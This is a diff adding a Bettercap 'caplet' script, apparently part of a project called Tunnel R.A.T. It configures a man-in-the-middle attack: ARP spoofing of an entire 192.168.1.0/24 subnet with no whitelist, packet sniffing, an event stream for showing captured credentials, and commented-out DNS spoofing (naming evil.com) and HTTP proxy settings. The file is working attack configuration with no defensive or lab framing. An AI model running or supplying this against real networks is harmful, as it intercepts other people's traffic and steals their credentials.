@@ -1,0 +1,41 @@
+# Tunnel R.A.T. - Bettercap MITM Caplet
+# Configure and enable MITM attack features
+
+# Show interface and target information
+net.show
+
+# Enable packet sniffing
+set net.sniff true
+
+# ARP Spoofing Configuration
+set arp.spoof.targets 192.168.1.0/24
+set arp.spoof.whitelist ""
+set arp.spoof.fullduplex true
+
+# DNS Spoofing Configuration (disabled by default)
+# Uncomment to enable
+# set dns.spoof.domains example.com,evil.com
+# set dns.spoof.all false
+
+# HTTP Proxy Configuration (disabled by default)
+# Uncomment to enable
+# set http.proxy.port 8080
+# set http.proxy.script ""
+
+# HTTP Server Configuration (for DNS spoof redirects)
+# set http.server.address 192.168.1.X
+# set http.server.port 80
+
+# Enable logging
+set log.level info
+
+# Display discovered credentials
+events.stream on
+
+# Start sniffing
+print "[*] Tunnel R.A.T. MITM Caplet Loaded"
+print "[*] Enable features:"
+print "    arp.spoof on          - Start ARP spoofing"
+print "    dns.spoof on          - Start DNS spoofing"
+print "    http.proxy on         - Start HTTP proxy"
+print "    help                  - Show all commands"
